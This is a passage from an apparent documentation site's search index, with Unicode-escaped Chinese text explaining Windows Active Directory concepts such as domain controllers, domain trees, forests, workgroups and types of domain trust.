\u6784\u6210\u7684\u5bf9\u7b49\u7f51\u4e2d\uff0c\u6570\u636e\u7684\u4f20\u8f93\u662f\u975e\u5e38\u4e0d\u5b89\u5168\u7684 \u3002</p> <p>\u4e0d\u8fc7\u5728\u201c\u57df\u201d\u6a21\u5f0f\u4e0b\uff0c\u81f3\u5c11\u6709\u4e00\u53f0\u670d\u52a1\u5668\u8d1f\u8d23\u6bcf\u4e00\u53f0\u8054\u5165\u7f51\u7edc\u7684\u7535\u8111\u548c\u7528\u6237\u7684\u9a8c\u8bc1\u5de5\u4f5c\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5355\u4f4d\u7684\u95e8\u536b\u4e00\u6837\uff0c\u79f0\u4e3a\u201c\u57df\u63a7\u5236\u5668\uff08Domain Controller\uff0c\u7b80\u5199\u4e3aDC\uff09\u201d\u3002</p> <p>\u57df\u63a7\u5236\u5668\u4e2d\u5305\u542b\u4e86\u7531\u8fd9\u4e2a\u57df\u7684\u8d26\u6237\u3001\u5bc6\u7801\u3001\u5c5e\u4e8e\u8fd9\u4e2a\u57df\u7684\u8ba1\u7b97\u673a\u7b49\u4fe1\u606f\u6784\u6210\u7684\u6570\u636e\u5e93\u3002\u5f53\u7535\u8111\u63a5\u5165\u7f51\u7edc\u65f6\uff0c\u57df\u63a7\u5236\u5668\u9996\u5148\u8981\u9274\u522b\u8fd9\u53f0\u7535\u8111\u662f\u5426\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u57df\u7684\uff0c\u7528\u6237\u4f7f\u7528\u7684\u767b\u5f55\u8d26\u53f7\u662f\u5426\u5b58\u5728\u3001\u5bc6\u7801\u662f\u5426\u6b63\u786e\u3002\u5982\u679c\u4ee5\u4e0a\u4fe1\u606f\u6709\u4e00\u6837\u4e0d\u6b63\u786e\uff0c\u90a3\u4e48\u57df\u63a7\u5236\u5668\u5c31\u4f1a\u62d2\u7edd\u8fd9\u4e2a\u7528\u6237\u4ece\u8fd9\u53f0\u7535\u8111\u767b\u5f55\u3002\u4e0d\u80fd\u767b\u5f55\uff0c\u7528\u6237\u5c31\u4e0d\u80fd\u8bbf\u95ee\u670d\u52a1\u5668\u4e0a\u6709\u6743\u9650\u4fdd\u62a4\u7684\u8d44\u6e90\uff0c\u4ed6\u53ea\u80fd\u4ee5\u5bf9\u7b49\u7f51\u7528\u6237\u7684\u65b9\u5f0f\u8bbf\u95ee Windows \u5171\u4eab\u51fa\u6765\u7684\u8d44\u6e90\uff0c\u8fd9\u6837\u5c31\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u4fdd\u62a4\u4e86\u7f51\u7edc\u4e0a\u7684\u8d44\u6e90\u3002</p> <p>\u8981\u628a\u4e00\u53f0\u7535\u8111\u52a0\u5165\u57df\uff0c\u4ec5\u4ec5\u4f7f\u5b83\u548c\u670d\u52a1\u5668\u5728\u7f51\u4e0a\u90bb\u5c45\u4e2d\u80fd\u591f\u76f8\u4e92\u201c\u770b\u201d\u5230\u662f\u8fdc\u8fdc\u4e0d\u591f\u7684\uff0c\u5fc5\u987b\u8981\u7531\u7f51\u7edc\u7ba1\u7406\u5458\u8fdb\u884c\u76f8\u5e94\u7684\u8bbe\u7f6e\uff0c\u628a\u8fd9\u53f0\u7535\u8111\u52a0\u5165\u5230\u57df\u4e2d\u3002\u8fd9\u6837\u624d\u80fd\u5b9e\u73b0\u6587\u4ef6\u7684\u5171\u4eab\uff0c\u96c6\u4e2d\u7edf\u4e00\uff0c\u4fbf\u4e8e\u7ba1\u7406\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#2_2","title":"2.\u57df\u7ed3\u6784","text":"<p>\u57df\u7ed3\u6784\u662f\u5f88\u590d\u6742\u7684\uff0c\u56e0\u4e3a\u5bf9\u4e8e\u4e0d\u540c\u4f53\u91cf\u5927\u5c0f\u7684\u4f01\u4e1a\uff0c\u9700\u6c42\u4e0d\u540c\u3002\u57df\u7ed3\u6784\u53ef\u4ee5\u5206\u4e3a\u5355\u57df\u3001\u57df\u6811\u3001\u57df\u6797\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#1_3","title":"(1) \u5355\u57df","text":"<p>\u5bf9\u4e8e\u5c0f\u578b\u516c\u53f8\u6765\u8bf4\uff0c\u5355\u57df\u5373\u53ef\u6ee1\u8db3\u9700\u6c42\u3002\u6240\u6709\u7684\u673a\u5668\u90fd\u52a0\u5165\u5230\u4e00\u4e2a\u57df\u4e2d\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u5355\u57df\u7684\u62d3\u6251\u56fe\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#2_3","title":"(2) \u57df\u6811","text":"<p>\u57df\u6811\u6307\u82e5\u5e72\u4e2a\u57df\u901a\u8fc7\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u7ec4\u6210\u7684\u96c6\u5408\u3002\u4e00\u4e2a\u57df\u7ba1\u7406\u5458\u53ea\u80fd\u7ba1\u7406\u672c\u57df\u7684\u5185\u90e8\uff0c\u4e0d\u80fd\u8bbf\u95ee\u6216\u8005\u7ba1\u7406\u5176\u4ed6\u7684\u57df\uff0c\u4e8c\u4e2a\u57df\u4e4b\u95f4\u76f8\u4e92\u8bbf\u95ee\u5219\u9700\u8981\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb(Trust Relation)\u3002</p> <p>\u4fe1\u4efb\u5173\u7cfb\u662f\u8fde\u63a5\u5728\u57df\u4e0e\u57df\u4e4b\u95f4\u7684\u6865\u6881\u3002\u7236\u57df\u4e0e\u5b50\u57df\u4e4b\u95f4\u81ea\u52a8\u5efa\u7acb\u8d77\u4e86\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\uff0c\u5e76\u4e14\u4fe1\u4efb\u5173\u7cfb\u53ef\u4f20\u9012\u3002</p> <p>\u57df\u6811\u5185\u7684\u7236\u57df\u4e0e\u5b50\u57df\u4e4b\u95f4\u4e0d\u4f46\u53ef\u4ee5\u6309\u9700\u8981\u76f8\u4e92\u8fdb\u884c\u7ba1\u7406\uff0c\u8fd8\u53ef\u4ee5\u8de8\u7f51\u5206\u914d\u6587\u4ef6\u548c\u6253\u5370\u673a\u7b49\u8bbe\u5907\u8d44\u6e90\uff0c\u4f7f\u4e0d\u540c\u7684\u57df\u4e4b\u95f4\u5b9e\u73b0\u7f51\u7edc\u8d44\u6e90\u7684\u5171\u4eab\u4e0e\u7ba1\u7406\uff0c\u4ee5\u53ca\u76f8\u4e92\u901a\u4fe1\u548c\u6570\u636e\u4f20\u8f93</p> <p>\u5982\u56fe\u6240\u793a\u57df\u6811\u67b6\u6784\uff0cxie.com \u4e0e shanghai.xie.com \u548c beijing.xie.com \u662f\u7236\u5b50\u57df\u5173\u7cfb\uff0c\u56e0\u6b64\u4ed6\u4eec\u4e4b\u95f4\u81ea\u52a8\u5efa\u7acb\u8d77\u4e86\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\u3002\u800c beijing.xie.com \u4e0ex.beijing.xie.com \u548c y.beijing.xie.com\u3001shanghai.xie.com \u548cx.shanghai.xie.com \u4e5f\u5c5e\u4e8e\u7236\u5b50\u57df\u5173\u7cfb\uff0c\u56e0\u6b64\u4ed6\u4eec\u4e4b\u95f4\u4e5f\u81ea\u52a8\u5efa\u7acb\u8d77\u4e86\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\u3002\u56e0\u6b64\uff0c\u5728\u8be5\u57df\u6811\u5185\uff0c\u6240\u6709\u7684\u57df\u90fd\u6709\u4fe1\u4efb\u5173\u7cfb\uff0c\u56e0\u6b64\u53ea\u8981\u62e5\u6709\u4efb\u4f55\u4e00\u4e2a\u57df\u5185\u7684\u6743\u9650\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5176\u4ed6\u57df\u5185\u7684\u8d44\u6e90\u3002\u5728\u57df\u6811\u5185\u7684\u6240\u6709\u57df\u5171\u4eab\u4e00\u4e2a AD DS \u57df\u670d\u52a1\uff0c\u4e5f\u5c31\u662f\u5728\u6b64\u57df\u6811\u4e4b\u4e0b\u53ea\u6709\u4e00\u4e2a AD DS \u57df\u670d\u52a1\uff0c\u4e0d\u8fc7\u5176\u6570\u636e\u662f\u5206\u6563\u5b58\u50a8\u5728\u5404\u4e2a\u57df\u4e2d\u7684\uff0c\u6bcf\u4e00\u4e2a\u57df\u4e2d\u53ea\u5b58\u50a8\u7740\u5c5e\u4e8e\u8be5\u57df\u7684\u6570\u636e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#_4","title":"\u5efa\u7acb\u57df\u6811\u7684\u597d\u5904","text":"<ul> <li>\u5982\u679c\u628a\u4e0d\u540c\u5730\u7406\u4f4d\u7f6e\u7684\u5206\u516c\u53f8\u653e\u5728\u540c\u4e00\u4e2a\u57df\u5185\uff0c\u90a3\u4e48\u4ed6\u4eec\u4e4b\u95f4\u4fe1\u606f\u4ea4\u4e92\uff08\u5305\u62ec\u540c\u6b65\uff0c\u590d\u5236\u7b49\uff09\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u4f1a\u6bd4\u8f83\u957f\uff0c\u800c\u4e14\u5360\u7528\u7684\u5e26\u5bbd\u4e5f\u6bd4\u8f83\u5927\u3002\u56e0\u4e3a\u5728\u540c\u4e00\u4e2a\u57df\u5185\uff0c\u4fe1\u606f\u4ea4\u4e92\u7684\u6761\u76ee\u662f\u5f88\u591a\u7684\uff0c\u800c\u4e14\u4e0d\u538b\u7f29\uff1b\u800c\u5728\u57df\u548c\u57df\u4e4b\u95f4\uff0c\u4fe1\u606f\u4ea4\u4e92\u7684\u6761\u76ee\u76f8\u5bf9\u8f83\u5c11\uff0c\u800c\u4e14\u538b\u7f29\u3002</li> <li>\u8fd8\u6709\u4e00\u4e2a\u597d\u5904\uff0c\u5c31\u662f\u5b50\u516c\u53f8\u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u7684\u57df\u6765\u7ba1\u7406\u81ea\u5df1\u7684\u8d44\u6e90\u3002</li> <li>\u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\uff0c\u5c31\u662f\u51fa\u4e8e\u5b89\u5168\u7b56\u7565\u7684\u8003\u8651\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u57df\u90fd\u6709\u81ea\u5df1\u72ec\u6709\u7684\u5b89\u5168\u7b56\u7565\u3002\u6bd4\u5982\u4e00\u4e2a\u516c\u53f8\u7684\u8d22\u52a1\u90e8\u95e8\u5e0c\u671b\u80fd\u4f7f\u7528\u7279\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff08\u5305\u62ec\u5e10\u53f7\u5bc6\u7801\u7b56\u7565\u7b49\uff09\uff0c\u90a3\u4e48\u53ef\u4ee5\u5c06\u8d22\u52a1\u90e8\u95e8\u505a\u6210\u4e00\u4e2a\u5b50\u57df\u6765\u5355\u72ec\u7ba1\u7406\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#3","title":"(3) \u57df\u6797","text":"<p>\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u6ca1\u6709\u5f62\u6210\u8fde\u7eed\u540d\u79f0\u7a7a\u95f4\u7684\u57df\u6811\u7ec4\u6210\uff0c\u6797\u4e2d\u6bcf\u4e2a\u57df\u6811\u90fd\u6709\u552f\u4e00\u7684\u540d\u79f0\u7a7a\u95f4\uff0c\u4e4b\u95f4\u4e0d\u8fde\u7eed\u3002\u57df\u6797\u6307\u82e5\u5e72\u4e2a\u57df\u6811\u901a\u8fc7\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u7ec4\u6210\u7684\u96c6\u5408\u3002\u53ef\u4ee5\u901a\u8fc7\u57df\u6811\u4e4b\u95f4\u5efa\u7acb\u7684\u4fe1\u4efb\u5173\u7cfb\u6765\u7ba1\u7406\u548c\u4f7f\u7528\u6574\u4e2a\u57df\u6797\u4e2d\u7684\u8d44\u6e90\uff0c\u4ece\u800c\u53c8\u4fdd\u6301\u4e86\u539f\u6709\u57df\u81ea\u8eab\u539f\u6709\u7684\u7279\u6027\u3002</p> <p>\u540c\u4e00\u4e2a\u6797\u4e2d\uff0c\u6797\u6839\u57df\u4e0e\u5176\u4ed6\u6811\u6839\u57df\u81ea\u52a8\u5efa\u7acb\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\uff0c\u4fe1\u4efb\u5173\u7cfb\u53ef\u4f20\u9012\u3002\u56e0\u6b64\uff0c\u5728\u6797\u4e2d\uff0c\u53ea\u8981\u62e5\u6709\u5176\u4e2d\u4e00\u4e2a\u57df\u5185\u7684\u6743\u9650\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5176\u4ed6\u6797\u4e2d\u5176\u4ed6\u57df\u7684\u8d44\u6e90\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u57df\u6797\u7ed3\u6784\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#3_1","title":"3.\u57df\u7684\u529f\u80fd\u548c\u7279\u70b9","text":"<ul> <li>\u96c6\u4e2d\u7ba1\u7406\uff0c\u53ef\u4ee5\u96c6\u4e2d\u5730\u7ba1\u7406\u4f01\u4e1a\u4e2d\u6210\u5343\u4e0a\u4e07\u5206\u5e03\u4e8e\u5f02\u5730\u7684\u8ba1\u7b97\u673a\u548c\u7528\u6237\u3002</li> <li>\u4fbf\u6377\u7684\u8d44\u6e90\u8bbf\u95ee\uff0c\u80fd\u591f\u5f88\u5bb9\u6613\u5730\u5b9a\u4f4d\u5230\u57df\u4e2d\u7684\u8d44\u6e90\u3002 \u7528\u6237\u4f9d\u6b21\u767b\u5f55\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6574\u4e2a\u7f51\u7edc\u8d44\u6e90\uff0c\u96c6\u4e2d\u5730\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>\u53ef\u6269\u5c55\u6027\uff0c\u65e2\u53ef\u4ee5\u9002\u7528\u4e8e\u51e0\u5341\u53f0\u8ba1\u7b97\u673a\u7684\u5c0f\u89c4\u6a21\u7f51\u7edc\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u8de8\u56fd\u516c\u53f8\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#_5","title":"\u5de5\u4f5c\u7ec4\u548c\u57df\u7684\u533a\u522b","text":"<p>\u5de5\u4f5c\u7ec4\u662f\u4e00\u7fa4\u8ba1\u7b97\u673a\u7684\u96c6\u5408\uff0c\u5b83\u4ec5\u4ec5\u662f\u4e00\u4e2a\u903b\u8f91\u7684\u96c6\u5408\uff0c\u5404\u81ea\u8ba1\u7b97\u673a\u8fd8\u662f\u5404\u81ea\u7ba1\u7406\u7684\uff0c\u4f60\u8981\u8bbf\u95ee\u5176\u4e2d\u7684\u8ba1\u7b97\u673a\uff0c\u8fd8\u662f\u8981\u5230\u88ab\u8bbf\u95ee\u8ba1\u7b97\u673a\u4e0a\u6765\u5b9e\u73b0\u7528\u6237\u9a8c\u8bc1\u7684\u3002\u800c\u57df\u4e0d\u540c\uff0c\u57df\u662f\u4e00\u4e2a\u6709\u5b89\u5168\u8fb9\u754c\u7684\u8ba1\u7b97\u673a\u96c6\u5408\uff0c\u5728\u540c\u4e00\u4e2a\u57df\u4e2d\u7684\u8ba1\u7b97\u673a\u5f7c\u6b64\u4e4b\u95f4\u5df2\u7ecf\u5efa\u7acb\u4e86\u4fe1\u4efb\u5173\u7cfb\uff0c\u5728\u57df\u5185\u8bbf\u95ee\u5176\u4ed6\u673a\u5668\uff0c\u4f60\u53ea\u9700\u8981\u7ecf\u8fc7\u57df\u63a7\u7684\u8bb8\u53ef\u5373\u53ef\u3002</p> <p>\u57df\u548c\u5de5\u4f5c\u7ec4\u9002\u7528\u7684\u73af\u5883\u4e0d\u540c\uff0c\u57df\u4e00\u822c\u662f\u7528\u5728\u6bd4\u8f83\u5927\u7684\u7f51\u7edc\u91cc\uff0c\u5de5\u4f5c\u7ec4\u5219\u8f83\u5c0f\uff0c\u5728\u4e00\u4e2a\u57df\u4e2d\u9700\u8981\u4e00\u53f0\u7c7b\u4f3c\u670d\u52a1\u5668\u7684\u8ba1\u7b97\u673a\uff0c\u53eb\u57df\u63a7\u670d\u52a1\u5668\uff0c\u5176\u4ed6\u7535\u8111\u5982\u679c\u60f3\u4e92\u76f8\u8bbf\u95ee\u9996\u5148\u90fd\u662f\u7ecf\u8fc7\u5b83\u7684\uff0c\u4f46\u662f\u5de5\u4f5c\u7ec4\u5219\u4e0d\u540c\uff0c\u5728\u4e00\u4e2a\u5de5\u4f5c\u7ec4\u91cc\u7684\u6240\u6709\u8ba1\u7b97\u673a\u90fd\u662f\u5bf9\u7b49\u7684\uff0c\u4e5f\u5c31\u662f\u6ca1\u6709\u670d\u52a1\u5668\u548c\u5ba2\u6237\u673a\u4e4b\u5206\u7684\uff0c\u4f46\u662f\u548c\u57df\u4e00\u6837\uff0c\u5982\u679c\u4e00\u53f0\u8ba1\u7b97\u673a\u60f3\u8bbf\u95ee\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u8bdd\u9996\u5148\u4e5f\u8981\u627e\u5230\u8fd9\u4e2a\u7ec4\u4e2d\u7684\u4e00\u53f0\u7c7b\u4f3c\u7ec4\u63a7\u670d\u52a1\u5668\uff0c\u7ec4\u63a7\u670d\u52a1\u5668\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u4ee5\u9009\u4e3e\u7684\u65b9\u5f0f\u5b9e\u73b0\uff0c\u5b83\u5b58\u50a8\u7740\u8fd9\u4e2a\u7ec4\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u627e\u5230\u8fd9\u53f0\u8ba1\u7b97\u673a\u540e\u5f97\u5230\u7ec4\u7684\u4fe1\u606f\u7136\u540e\u8bbf\u95ee\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html","title":"\u57df\u4fe1\u4efb","text":"<p>\u57df\u4fe1\u4efb(Domain Trust)\u662f\u4e3a\u4e86\u89e3\u51b3\u591a\u57df\u73af\u5883\u4e0b\u7684\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u95ee\u9898\u800c\u8bde\u751f\u7684\u3002\u4e24\u4e2a\u57df\u4e4b\u95f4\u5fc5\u987b\u62e5\u6709\u4fe1\u4efb\u5173\u7cfb(Trust Relationship),\u624d\u53ef\u4ee5\u4e92\u76f8\u8bbf\u95ee\u5230\u5bf9\u65b9\u57df\u5185\u7684\u8d44\u6e90\u3002\u7531\u4e8e\u6b64\u4fe1\u4efb\u5de5\u4f5c\u662f\u901a\u8fc7Kerberos\u534f\u8bae\u5b8c\u6210\u7684\uff0c\u56e0\u6b64\u4e5f\u88ab\u79f0\u4e3aKerberos Trust\u3002</p> <p>\u57df\u4fe1\u4efb\u4f5c\u4e3a\u4e00\u79cd\u673a\u5236\uff0c\u5141\u8bb8\u53e6\u4e00\u4e2a\u57df\u7684\u7528\u6237\u5728\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u540e\u8bbf\u95ee\u672c\u57df\u5185\u7684\u8d44\u6e90\u3002\u540c\u65f6\uff0c\u57df\u4fe1\u4efb\u5229\u7528 DNS \u670d\u52a1\u5668\u5b9a\u4f4d\u4e24\u4e2a\u4e0d\u540c\u5b50\u57df\u7684\u57df\u63a7\u5236\u5668\uff0c\u5982\u679c\u4e24\u4e2a\u57df\u4e2d\u7684\u57df\u63a7\u5236\u5668\u90fd\u65e0\u6cd5\u627e\u5230\u53e6\u4e00\u4e2a\u57df\uff0c\u90a3\u4e48\u4e5f\u5c31\u4e0d\u5b58\u5728\u901a\u8fc7\u57df\u4fe1\u4efb\u5173\u7cfb\u8fdb\u884c\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#_2","title":"\u5355\u5411\u4fe1\u4efb\u3001\u53cc\u5411\u4fe1\u4efb\u548c\u5feb\u6377\u4fe1\u4efb","text":"<p>\u57df\u4fe1\u4efb\u5173\u7cfb\u53ef\u4ee5\u5206\u4e3a\u5355\u5411\u4fe1\u4efb\u3001\u53cc\u5411\u4fe1\u4efb\u548c\u5feb\u6377\u4fe1\u4efb\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#1","title":"1.\u5355\u5411\u4fe1\u4efb","text":"<p>\u5355\u5411\u4fe1\u4efb\u662f\u6307\u5728\u4e24\u4e2a\u57df\u4e4b\u95f4\u521b\u5efa\u5355\u5411\u7684\u4fe1\u4efb\u8def\u5f84\uff0c\u5373\u5728\u4e00\u4e2a\u65b9\u5411\u4e0a\u662f\u4fe1\u4efb\u6d41\uff0c\u5728\u53e6\u4e00\u4e2a\u65b9\u5411\u4e0a\u662f\u8bbf\u95ee\u6d41\u3002\u5728\u4fe1\u4efb\u57df\u548c\u53d7\u4fe1\u4efb\u57df\u4e4b\u95f4\u7684\u5355\u5411\u4fe1\u4efb\u4e2d\uff0c\u53d7\u4fe1\u4efb\u57df\u5185\u7684\u7528\u6237\u6216\u8ba1\u7b97\u673a\u53ef\u4ee5\u8bbf\u95ee\u4fe1\u4efb\u57df\u4e2d\u7684\u8d44\u6e90\uff0c\u4f46\u4fe1\u4efb\u57df\u5185\u7684\u7528\u6237\u6216\u8ba1\u7b97\u673a\u5374\u65e0\u6cd5\u8bbf\u95ee\u53d7\u4fe1\u4efb\u57df\u5185\u7684\u8d44\u6e90\u3002</p> <p>\u5982\u56fe\u6240\u793a\u5355\u5411\u4fe1\u4efb\u57df\u67b6\u6784\uff0c\u57df A \u4fe1\u4efb\u57df B \u548c\u57df C\uff0c\u90a3\u4e48\u57df B \u5185\u548c\u57df C \u5185\u53d7\u4fe1\u4efb\u7684\u4e3b\u4f53\u53ef\u4ee5\u8bbf\u95ee\u57df A \u5185\u7684\u8d44\u6e90\uff0c\u4f46\u57df A \u5185\u7684\u4e3b\u4f53\u5374\u65e0\u6cd5\u8bbf\u95ee\u57df B \u548c\u57df C \u5185\u7684\u8d44\u6e90\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#2","title":"2.\u53cc\u5411\u4fe1\u4efb","text":"<p>\u53cc\u5411\u4fe1\u4efb\u662f\u6307\u4e24\u4e2a\u5355\u5411\u4fe1\u4efb\u7684\u7ec4\u5408\uff0c\u4fe1\u4efb\u57df\u548c\u53d7\u4fe1\u4efb\u57df\u5f7c\u6b64\u4fe1\u4efb\uff0c\u5728\u4e24\u4e2a\u65b9\u5411\u4e0a\u90fd\u6709\u4fe1\u4efb\u6d41\u548c\u8bbf\u95ee\u6d41\u3002\u8fd9\u610f\u5473\u7740\uff0c\u53ef\u4ee5\u4ece\u4e24\u4e2a\u65b9\u5411\u5728\u4e24\u4e2a\u57df\u4e4b\u95f4\u4f20\u9012\u8eab\u4efd\u9a8c\u8bc1\u8bf7\u6c42\u3002\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u57df\u4fe1\u4efb\u5173\u7cfb\u90fd\u662f\u53cc\u5411\u53ef\u4f20\u9012\u4fe1\u4efb\u7684\u3002\u4efb\u4f55\u4e00\u4e2a\u65b0\u7684\u5b50\u57df\u52a0\u5165\u5230\u57df\u6797\u4e4b\u540e\uff0c\u8fd9\u4e2a\u57df\u4f1a\u81ea\u52a8\u4fe1\u4efb\u5176\u4e0a\u4e00\u5c42\u7684\u7236\u57df\uff0c\u540c\u65f6\u7236\u57df\u4e5f\u4f1a\u81ea\u52a8\u4fe1\u4efb\u65b0\u5b50\u57df\uff0c\u8fd9\u79cd\u4fe1\u4efb\u5173\u7cfb\u79f0\u4e3a\u7236\u5b50\u4fe1\u4efb\uff1b\u7531\u4e8e\u8fd9\u4e9b\u4fe1\u4efb\u5173\u7cfb\u5177\u5907\u53cc\u5411\u4f20\u9012\u6027(Two-Way Transitive)\uff0c\u56e0\u6b64\u6797\u6839\u57df\u548c\u5176\u4ed6\u6811\u6839\u57df\u4e4b\u95f4\u4e5f\u4f1a\u81ea\u52a8\u53cc\u5411\u4fe1\u4efb\uff0c\u8fd9\u79f0\u4e3a\u6811\u4fe1\u4efb\u3002\u5728\u65e9\u671f\u7684\u57df\u4e2d\uff0c\u57df\u4fe1\u4efb\u662f\u5355\u5411\u7684\uff0c\u4ece Windows Server2003 \u5f00\u59cb\uff0c\u57df\u4fe1\u4efb\u5173\u7cfb\u53d8\u4e3a\u53cc\u5411\u7684\u3002</p> <p>\u5982\u56fe\u6240\u793a\u53cc\u5411\u4fe1\u4efb\u57df\u67b6\u6784\uff1a\u57df A \u548c\u57df B\u3001\u57df C \u4e4b\u95f4\u90fd\u662f\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\uff1b\u57df A \u4fe1\u4efb\u57df B\uff0c\u57df B \u4e5f\u4fe1\u4efb\u57df A\uff1b\u57df A \u4fe1\u4efb\u57df C\uff0c\u57df C \u4e5f\u4fe1\u4efb\u57df A\u3002\u6240\u4ee5\u5f53\u4efb\u4f55\u4e00\u4e2a\u65b0\u57df\u52a0\u5165\u5230\u57df\u6811\u540e\uff0c\u9ed8\u8ba4\u5b83\u4f1a\u81ea\u52a8\u7684\u5efa\u7acb\u8d77\u53cc\u5411\u4fe1\u4efb\u7684\u5173\u7cfb\u3002\u56e0\u6b64\u53ea\u8981\u62e5\u6709\u4efb\u4f55\u4e00\u4e2a\u57df\u5185\u7684\u6743\u9650\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5176\u4ed6\u57df\u5185\u7684\u8d44\u6e90\u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#3","title":"3.\u5feb\u6377\u4fe1\u4efb","text":"<p>\u5feb\u6377\u4fe1\u4efb\u5176\u5b9e\u5c5e\u4e8e\u53cc\u5411\u4fe1\u4efb\uff0c\u5feb\u6377\u4fe1\u4efb\u662f\u6307\u4e24\u4e2a\u5b50\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u57df A \u4fe1\u4efb\u57df B\uff0c\u57df B \u4e5f\u4fe1\u4efb\u57df A\uff1b\u57df A \u4fe1\u4efb\u57df C\uff0c\u57df C \u4e5f\u4fe1\u4efb\u57df A\u3002\u6b64\u65f6\u57df B \u548c\u57df C \u4e4b\u95f4\u4e5f\u6709\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\u3002\u7531\u4e8e\u57df\u662f\u6811\u72b6\u7ed3\u6784\uff0c\u5982\u679c\u57df B \u5230\u57df C \u53cc\u5411\u4fe1\u4efb\uff0c\u9700\u8981\u5148\u7ecf\u8fc7\u6797\u6839\u57df A\uff0c\u8fd9\u4e2d\u95f4\u80af\u5b9a\u4f1a\u591a\u5f88\u591a\u8ba4\u8bc1\u6d41\u7a0b\u548c\u6b65\u9aa4\u3002\u56e0\u6b64\uff0c\u57df B\u548c\u57df C \u4e4b\u95f4\u9ed8\u8ba4\u5efa\u7acb\u8d77\u4e86\u4e00\u4e2a\u5feb\u6377\u4fe1\u4efb\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#_3","title":"\u5185\u90e8\u4fe1\u4efb\u3001\u5916\u90e8\u4fe1\u4efb\u548c\u6797\u4fe1\u4efb","text":"<p>\u57df\u4fe1\u4efb\u6839\u636e\u4f5c\u7528\u8303\u56f4\u8fd8\u53ef\u4ee5\u5206\u4e3a\u5185\u90e8\u4fe1\u4efb\u3001\u5916\u90e8\u4fe1\u4efb\u548c\u6797\u4fe1\u4efb\uff1b\u5185\u90e8\u4fe1\u4efb\u662f\u76f8\u5bf9\u4e8e\u540c\u4e00\u4e2a\u6797\u6765\u8bf4\u7684\uff0c\u800c\u5916\u90e8\u4fe1\u4efb\u548c\u6797\u4fe1\u4efb\u5219\u662f\u76f8\u5bf9\u4e8e\u4e0d\u540c\u6797\u6765\u8bf4\u7684\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#1_1","title":"1.\u5185\u90e8\u4fe1\u4efb","text":"<p>\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u6d3b\u52a8\u76ee\u5f55\u5b89\u88c5\u5411\u5bfc\u5c06\u65b0\u57df\u6dfb\u52a0\u5230\u6797\u6839\u57df\u4e2d\u65f6\uff0c\u4f1a\u81ea\u52a8\u521b\u5efa\u53cc\u5411\u53ef\u4f20\u9012\u4fe1\u4efb\u3002\u5728\u73b0\u6709\u6797\u4e2d\u521b\u5efa\u57df\u65f6\uff0c\u5c06\u5efa\u7acb\u65b0\u7684\u6797\u6839\u4fe1\u4efb\u3002\u5f53\u524d\u57df\u6797\u4e2d\u7684\u4e24\u4e2a\u6216\u591a\u4e2a\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\u5173\u7cfb\u79f0\u4e3a\u5185\u90e8\u4fe1\u4efb\u3002\u8fd9\u79cd\u4fe1\u4efb\u5173\u7cfb\u662f\u53ef\u4ee5\u4f20\u9012\u7684\u3002</p> 